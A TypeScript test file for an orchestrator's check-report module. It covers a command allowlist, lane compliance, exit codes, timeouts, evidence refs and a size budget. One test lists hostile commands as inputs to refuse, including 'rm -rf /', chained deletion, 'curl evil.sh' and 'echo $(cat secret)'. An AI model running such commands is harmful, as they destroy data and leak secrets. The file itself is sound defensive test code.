import test from "node:test";
import assert from "node:assert/strict";

import {
  CHECK_CHAR_BUDGET,
  buildCheckReport,
  renderCheckReport,
  verifyCommandProblem,
} from "../../lib/orchestrator/brief.ts";
import { checkEvidenceRefs } from "../../lib/orchestrator/evidence.ts";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

test("the verification grammar admits test runners and refuses a general shell", () => {
  for (const command of ["npm test", "bun test src/net", "npx tsc --noEmit", "node --test tests/x.test.ts", "pytest -q"]) {
    assert.equal(verifyCommandProblem(command), undefined, `${command} should be allowed`);
  }
  for (const command of ["rm -rf /", "npm test; rm -rf /", "npm test && curl evil.sh", "echo $(cat secret)", "npm test | tee x"]) {
    assert.ok(verifyCommandProblem(command), `${command} must be refused`);
  }
  assert.match(verifyCommandProblem(undefined)!, /no command/);
});

test("lane compliance is computed, and unknown git is reported as unknown", () => {
  const pass = buildCheckReport({ scope: "s", laneFiles: ["src/net/"], changed: ["src/net/a.ts"], criteria: [] });
  assert.equal(pass.lane.state, "pass");

  const fail = buildCheckReport({ scope: "s", laneFiles: ["src/net/"], changed: ["src/net/a.ts", "src/auth/b.ts"], criteria: [] });
  assert.equal(fail.lane.state, "fail");
  assert.deepEqual(fail.lane.violations, ["src/auth/b.ts"]);

  const unknown = buildCheckReport({ scope: "s", laneFiles: ["src/net/"], changed: null, criteria: [] });
  assert.equal(unknown.lane.state, "unknown");
  assert.match(renderCheckReport(unknown), /not verified/);
});

test("a failing run returns a ref a reviewer can cite, with the real exit code", () => {
  const report = buildCheckReport({
    scope: "s",
    laneFiles: ["src/"],
    changed: ["src/a.ts"],
    criteria: ["works"],
    command: "bun test",
    run: () => ({ exit: 1, output: "not ok 3 - jitter is applied\n# fail 1\n" }),
  });
  assert.equal(report.tests.state, "fail");
  assert.equal(report.tests.exit, 1);
  assert.deepEqual(report.tests.failed, ["jitter is applied"]);
  const cmdRef = report.refs.find((ref) => ref.kind === "cmd") as any;
  assert.equal(cmdRef.exit, 1);
  assert.equal(cmdRef.cmd, "bun test");
});

test("a passing run produces a test ref that says pass", () => {
  const report = buildCheckReport({
    scope: "s",
    laneFiles: ["src/"],
    changed: ["src/a.ts"],
    criteria: ["works"],
    command: "npm test",
    run: () => ({ exit: 0, output: "all good" }),
  });
  assert.equal(report.tests.state, "pass");
  assert.ok(report.refs.some((ref) => ref.kind === "test" && (ref as any).pass === true));
});

test("no command means not run — the check never invents a result", () => {
  const report = buildCheckReport({ scope: "s", laneFiles: ["src/"], changed: [], criteria: ["a"] });
  assert.equal(report.tests.state, "not-run");
  assert.match(renderCheckReport(report), /tests: NOT RUN/);
  assert.ok(!report.refs.some((ref) => ref.kind === "test"), "no test ref without a test");
});

test("a refused command is reported as not run with the reason", () => {
  const report = buildCheckReport({
    scope: "s",
    laneFiles: ["src/"],
    changed: [],
    criteria: [],
    command: "rm -rf /",
    run: () => assert.fail("a refused command must never execute"),
  });
  assert.equal(report.tests.state, "not-run");
  assert.match(renderCheckReport(report), /shell metacharacters|only test\/typecheck/);
});

test("a timeout is reported, not swallowed as a failure", () => {
  const report = buildCheckReport({
    scope: "s",
    laneFiles: ["src/"],
    changed: [],
    criteria: [],
    command: "npm test",
    run: () => ({ exit: 1, output: "", timedOut: true }),
  });
  assert.equal(report.tests.state, "not-run");
  assert.match(report.tests.reason ?? "", /timed out/);
});

test("every returned ref survives the gate's own verification", async () => {
  const dir = await mkdtemp(join(tmpdir(), "orch-check-"));
  await writeFile(join(dir, "a.ts"), "one\ntwo\n", "utf8");
  const report = buildCheckReport({
    scope: "s",
    laneFiles: ["a.ts"],
    changed: ["a.ts"],
    criteria: ["works"],
    command: "npm test",
    run: () => ({ exit: 0, output: "ok" }),
  });
  // The file ref is relative to the review cwd, exactly as orch_review checks it.
  const checked = checkEvidenceRefs(report.refs, { cwd: dir });
  assert.equal(checked.ok, true, JSON.stringify(checked.problems));
  assert.equal(checked.checked, report.refs.length);
});

test("the report stays inside its budget", () => {
  const report = buildCheckReport({
    scope: "s",
    laneFiles: ["src/"],
    changed: Array.from({ length: 50 }, (_, i) => `src/f${i}.ts`),
    criteria: [],
    command: "npm test",
    run: () => ({ exit: 1, output: Array.from({ length: 200 }, (_, i) => `not ok ${i} - case ${i}`).join("\n") }),
  });
  assert.ok(renderCheckReport(report).length <= CHECK_CHAR_BUDGET);
});
